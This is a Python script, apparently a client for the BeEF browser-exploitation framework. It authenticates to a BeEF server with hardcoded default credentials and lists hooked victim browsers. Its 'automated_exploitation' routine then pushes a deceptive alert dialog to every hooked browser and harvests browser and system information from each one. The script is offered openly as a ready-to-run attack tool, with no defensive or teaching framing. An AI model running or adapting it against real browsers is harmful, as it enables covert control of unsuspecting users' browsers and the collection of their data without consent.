#!/usr/bin/env python3

import requests
import json
import time
import sys

class BeEFAutomation:
    def __init__(self, beef_host="localhost", beef_port="3000", api_key="beef_api_key_2023"):
        self.base_url = f"http://{beef_host}:{beef_port}/api"
        self.api_key = api_key
        self.token = None
        self.session = requests.Session()
        
    def authenticate(self, username="beef", password="beef123"):
        """Authenticate with BeEF and get session token"""
        auth_data = {
            "username": username,
            "password": password
        }
        
        try:
            response = self.session.post(
                f"{self.base_url}/admin/login",
                json=auth_data,
                headers={"Content-Type": "application/json"}
            )
            
            if response.status_code == 200:
                result = response.json()
                self.token = result.get("token")
                print(f"[+] Authentication successful. Token: {self.token[:20]}...")
                return True
            else:
                print(f"[-] Authentication failed: {response.status_code}")
                return False
                
        except Exception as e:
            print(f"[-] Authentication error: {str(e)}")
            return False
    
    def get_hooked_browsers(self):
        """Get list of hooked browsers"""
        if not self.token:
            print("[-] Not authenticated")
            return []
            
        try:
            response = self.session.get(
                f"{self.base_url}/hooks",
                params={"token": self.token}
            )
            
            if response.status_code == 200:
                hooks = response.json()
                print(f"[+] Found {len(hooks['hooked-browsers'])} hooked browsers")
                return hooks['hooked-browsers']
            else:
                print(f"[-] Failed to get hooks: {response.status_code}")
                return []
                
        except Exception as e:
            print(f"[-] Error getting hooks: {str(e)}")
            return []
    
    def execute_command(self, hook_id, module_id, command_data=None):
        """Execute a command on a hooked browser"""
        if not self.token:
            print("[-] Not authenticated")
            return False
            
        if command_data is None:
            command_data = {}
            
        payload = {
            "token": self.token,
            "command_module_id": module_id,
            **command_data
        }
        
        try:
            response = self.session.post(
                f"{self.base_url}/modules/{hook_id}/{module_id}",
                json=payload,
                headers={"Content-Type": "application/json"}
            )
            
            if response.status_code == 200:
                result = response.json()
                print(f"[+] Command executed successfully: {module_id}")
                return result
            else:
                print(f"[-] Command execution failed: {response.status_code}")
                return False
                
        except Exception as e:
            print(f"[-] Command execution error: {str(e)}")
            return False
    
    def get_command_results(self, hook_id, command_id):
        """Get results of executed command"""
        if not self.token:
            print("[-] Not authenticated")
            return None
            
        try:
            response = self.session.get(
                f"{self.base_url}/modules/{hook_id}/{command_id}",
                params={"token": self.token}
            )
            
            if response.status_code == 200:
                return response.json()
            else:
                print(f"[-] Failed to get command results: {response.status_code}")
                return None
                
        except Exception as e:
            print(f"[-] Error getting command results: {str(e)}")
            return None
    
    def automated_exploitation(self):
        """Perform automated exploitation sequence"""
        print("[*] Starting automated exploitation sequence...")
        
        # Get hooked browsers
        hooks = self.get_hooked_browsers()
        if not hooks:
            print("[-] No hooked browsers found")
            return
        
        for hook_session in hooks:
            hook_id = hook_session
            print(f"[*] Exploiting hook: {hook_id}")
            
            # Execute alert dialog
            print("[*] Executing alert dialog...")
            self.execute_command(hook_id, "social_engineering/create_alert_dialog", {
                "text": "Automated exploitation in progress..."
            })
            
            time.sleep(2)
            
            # Get browser information
            print("[*] Gathering browser information...")
            self.execute_command(hook_id, "browser/get_browser_info")
            
            time.sleep(2)
            
            # Get system information
            print("[*] Gathering system information...")
            self.execute_command(hook_id, "host/get_system_info")
            
            time.sleep(2)
            
            print(f"[+] Exploitation sequence completed for hook: {hook_id}")

def main():
    print("BeEF Automation Script")
    print("=" * 50)
    
    # Initialize BeEF automation
    beef = BeEFAutomation()
    
    # Authenticate
    if not beef.authenticate():
        print("[-] Failed to authenticate with BeEF")
        sys.exit(1)
    
    # Wait for user to hook a browser
    print("\n[*] Please ensure you have a browser hooked before continuing...")
    input("Press Enter when ready to proceed...")
    
    # Run automated exploitation
    beef.automated_exploitation()
    
    print("\n[+] Automation completed!")

if __name__ == "__main__":
    main()
EOF

